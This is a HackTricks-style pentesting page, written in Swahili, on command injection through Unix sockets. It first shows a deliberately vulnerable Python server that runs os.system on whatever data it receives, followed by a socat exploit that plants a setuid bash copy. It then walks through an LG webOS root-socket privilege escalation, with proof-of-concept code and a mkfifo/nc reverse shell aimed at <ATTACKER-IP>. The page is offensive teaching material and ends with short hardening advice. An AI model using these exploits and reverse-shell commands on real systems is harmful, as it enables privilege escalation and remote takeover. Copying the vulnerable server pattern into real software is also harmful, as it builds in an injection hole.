# Socket Command Injection

{{#include ../../banners/hacktricks-training.md}}

## Mfano wa Socket binding na Python

Katika mfano ufuatao **unix socket imeundwa** (`/tmp/socket_test.s`) na kila kitu **kinachopokelewa** kitatekelezwa na `os.system`. Najua hautakutana na hili kwa urahisi katika mazingira halisi, lakini lengo la mfano huu ni kuona jinsi code inayotumia unix sockets inavyoonekana, na jinsi ya kudhibiti input katika hali mbaya kabisa inayowezekana.
```python:s.py
import socket
import os, os.path
import time
from collections import deque

if os.path.exists("/tmp/socket_test.s"):
os.remove("/tmp/socket_test.s")

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
server.listen(1)
conn, addr = server.accept()
datagram = conn.recv(1024)
if datagram:
print(datagram)
os.system(datagram)
conn.close()
```
**Tekeleza** msimbo kwa kutumia python: `python s.py` na **angalia jinsi socket inavyosikiliza**:
```python
netstat -a -p --unix | grep "socket_test"
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
```
**Exploit**
```python
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```
## Uchambuzi wa kesi: Root-owned UNIX socket signal-triggered escalation (LG webOS)

Baadhi ya privileged daemons hutoa root-owned UNIX socket inayokubali untrusted input na kuunganisha vitendo vya privileged na thread-IDs na signals. Ikiwa protocol inaruhusu unprivileged client kuathiri ni native thread gani inalengwa, unaweza kuweza kusababisha privileged code path na escalate.

Mfano ulioshuhudiwa:
- Unganisha kwenye root-owned socket (mfano, /tmp/remotelogger).
- Tengeneza thread na upate native thread id (TID).
- Tuma TID (packed) pamoja na padding kama request; upokee acknowledgement.
- Toa signal maalum kwa TID hiyo ili ku-trigger privileged behaviour.

Muhtasari mdogo wa PoC:
```python
import socket, struct, os, threading, time
# Spawn a thread so we have a TID we can signal
th = threading.Thread(target=time.sleep, args=(600,)); th.start()
tid = th.native_id  # Python >=3.8
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/tmp/remotelogger")
s.sendall(struct.pack('<L', tid) + b'A'*0x80)
s.recv(4)  # sync
os.kill(tid, 4)  # deliver SIGILL (example from the case)
```
Ili kuibadilisha kuwa root shell, muundo rahisi wa named-pipe + nc unaweza kutumika:
```bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
```
Vidokezo:
- Aina hii ya mdudu hutokea kutokana na kuamini thamani zinazotokana na hali ya mteja isiyo na mamlaka (TIDs) na kuziunganisha kwa signal handlers au mantiki zenye ruhusa.
- Imarisha kwa kusisitiza maelezo ya uthibitisho kwenye socket, kuthibitisha muundo wa ujumbe, na kutenganisha operesheni zenye ruhusa kutoka kwa vitambulisho vya thread vinavyotolewa kutoka nje.

## Marejeleo

- [LG WebOS TV Path Traversal, Authentication Bypass and Full Device Takeover (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)

{{#include ../../banners/hacktricks-training.md}}
